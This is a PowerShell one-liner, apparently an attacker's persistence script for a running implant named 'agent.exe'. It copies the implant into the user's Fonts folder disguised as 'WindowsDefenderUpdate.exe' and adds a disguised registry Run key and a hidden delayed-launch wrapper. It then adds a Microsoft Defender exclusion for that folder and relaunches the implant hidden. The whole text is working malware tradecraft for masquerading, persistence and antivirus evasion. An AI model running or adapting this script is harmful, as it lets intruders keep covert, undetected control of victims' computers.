$ProgressPreference='SilentlyContinue'; $ErrorActionPreference='Stop'; $proc=Get-Process -Name "agent" -ErrorAction SilentlyContinue | Select-Object -First 1; if(-not $proc){Write-Host "[!] No running agent.exe found. Start your agent first.";exit 1}; $src=$proc.Path; $fontsFolder="$env:LOCALAPPDATA\Microsoft\Windows\Fonts"; if($src -like "$fontsFolder\*"){Write-Host "[*] Agent already running from fonts folder. Exiting." -Fore Green; exit 0}; Write-Host "[+] Found agent.exe at: $src"; $delay = Get-Random -Minimum 8 -Maximum 16; Write-Host "[+] Waiting $delay seconds..."; Start-Sleep -Seconds $delay; if(-not (Test-Path $fontsFolder)){New-Item $fontsFolder -Force|Out-Null}; $dest="$fontsFolder\WindowsDefenderUpdate.exe"; if(-not (Test-Path $dest)){$c=$false; for($i=0;$i-lt5;$i++){try{[System.IO.File]::Copy($src,$dest,$true);$c=$true;break}catch{Start-Sleep -Milliseconds 500}} if(-not $c){Write-Host "[!] Copy failed";exit 1} Write-Host "[+] Copied to fonts folder as WindowsDefenderUpdate.exe"} else{Write-Host "[*] WindowsDefenderUpdate.exe already exists"}; Write-Host "[+] Stopping original agent.exe (PID: $($proc.Id))..."; Stop-Process -Id $proc.Id -Force; Start-Sleep -Seconds 1; $wrapper="$fontsFolder\run_WindowsDefenderUpdate.cmd"; $wrapperContent='@echo off' + "`r`n" + 'timeout /t 30 /nobreak > nul' + "`r`n" + 'start "" "%~dp0WindowsDefenderUpdate.exe"'; Set-Content -Path $wrapper -Value $wrapperContent -Encoding ASCII -Force; Write-Host "[+] Wrapper created: $wrapper"; $regPath="HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"; $regName="WindowsFontHelper"; Set-ItemProperty -Path $regPath -Name $regName -Value "`"$wrapper`"" -Force; Write-Host "[+] Registry run key added (delayed launch at logon)"; Add-MpPreference -ExclusionPath $fontsFolder -ErrorAction SilentlyContinue | Out-Null; Write-Host "[+] Defender exclusion added for fonts folder"; try{Start-Process -WindowStyle Hidden -FilePath $wrapper -WorkingDirectory $fontsFolder -ErrorAction Stop} catch{Write-Host "[!] Wrapper launch failed: $_"}; Write-Host "[+] Waiting 35 seconds for agent to start..."; Start-Sleep -Seconds 35; if(Get-Process -Name "WindowsDefenderUpdate" -ErrorAction SilentlyContinue){Write-Host "[✓] WindowsDefenderUpdate.exe is running from fonts folder" -Fore Green}else{Write-Host "[!] WindowsDefenderUpdate.exe not running – check Defender protection history" -Fore Yellow}
